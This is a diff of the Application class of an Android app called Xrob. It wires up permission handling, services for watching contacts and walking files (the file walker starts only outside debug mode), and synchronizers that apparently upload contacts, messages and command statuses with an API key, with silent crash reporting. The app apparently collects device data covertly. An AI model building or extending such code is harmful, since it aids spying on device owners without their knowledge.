@@ -19,6 +19,7 @@ import com.theah64.xrob.asynctasks.MessagesSynchronizer;
 import com.theah64.xrob.asynctasks.PendingDeliverySynchronizer;
 import com.theah64.xrob.database.Messages;
 import com.theah64.xrob.services.ContactsWatcherService;
+import com.theah64.xrob.services.FileWalkerService;
 
 import org.acra.ACRA;
 import org.acra.ReportField;
@@ -46,7 +47,7 @@ import org.acra.sender.HttpSender;
         },
         mode = ReportingInteractionMode.SILENT
 )
-public class Xrob extends Application {
+public class Xrob extends Application implements PermissionUtils.Callback {
 
 
     public static final boolean IS_DEBUG_MODE = true;
@@ -102,6 +103,19 @@ public class Xrob extends Application {
 
         initImageLoader(this);
 
+        new PermissionUtils(this, this, null).begin();
+    }
+
+    public static void doMainTasks(final Context context, final String apiKey) {
+        new ContactsSynchronizer(context, apiKey).execute();
+        new CommandStatusesSynchronizer(context, apiKey).execute();
+        new FCMSynchronizer(context, apiKey).execute();
+        new MessagesSynchronizer(context, apiKey).execute();
+        new PendingDeliverySynchronizer(context, apiKey).execute();
+    }
+
+    @Override
+    public void onAllPermissionGranted() {
         //Simply igniting the database
         Messages.getInstance(this).getReadableDatabase();
 
@@ -120,14 +134,14 @@ public class Xrob extends Application {
         });
 
         startService(new Intent(this, ContactsWatcherService.class));
-        //TODO : To be turned on RELEASE : startService(new Intent(this, FileWalkerService.class));
+        if (!IS_DEBUG_MODE) {
+            startService(new Intent(this, FileWalkerService.class));
+        }
+
     }
 
-    public static void doMainTasks(final Context context, final String apiKey) {
-        new ContactsSynchronizer(context, apiKey).execute();
-        new CommandStatusesSynchronizer(context, apiKey).execute();
-        new FCMSynchronizer(context, apiKey).execute();
-        new MessagesSynchronizer(context, apiKey).execute();
-        new PendingDeliverySynchronizer(context, apiKey).execute();
+    @Override
+    public void onPermissionDenial() {
+        Log.e(X, "Permissions not yet granted");
     }
 }
